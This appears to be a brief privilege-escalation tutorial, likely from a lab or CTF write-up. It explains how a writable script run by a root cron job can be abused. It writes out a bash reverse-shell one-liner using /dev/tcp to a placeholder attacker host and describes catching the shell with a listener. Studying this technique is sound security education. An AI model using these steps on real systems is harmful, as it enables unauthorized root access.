# Cron jobs : 

Cron jobs are used to run scripts or binaries at specific times. By default, they run with the privilege of their owners and not the current user. While properly configured cron jobs are not inherently vulnerable, they can provide a privilege escalation vector under some conditions.

Cron job configurations are stored as crontabs (cron tables) to see the next time and date the task will run.

Each user on the system have their crontab file and can run specific tasks whether they are logged in or not. As you can expect, our goal will be to find a cron job set by root and have it run our script, ideally a shell.

Any user can read the file keeping system-wide cron jobs under 

  
    /etc/crontab
    
 
![crontab](https://user-images.githubusercontent.com/94765997/162629920-414a4311-fb87-4454-b684-132681eea082.png)

As our current user can access this script backup.sh , we can easily modify it to create a reverse shell, hopefully with root privileges.

The script will use the tools available on the target system to launch a reverse shell .
  
    bash -i >& /dev/tcp/@/N_port 0>&1

![catback](https://user-images.githubusercontent.com/94765997/162630021-89e2f7a3-12e7-4fe1-811c-1bd3c50b4437.png)

![19](https://user-images.githubusercontent.com/94765997/162630043-cefb943a-77e3-4257-8a16-9e38b8c6cd72.png)

We will now run a listener on our attacking machine to receive the incoming connection : 

![20](https://user-images.githubusercontent.com/94765997/162630121-4e400743-95dc-40d9-a76c-eb3a0085b6af.png)
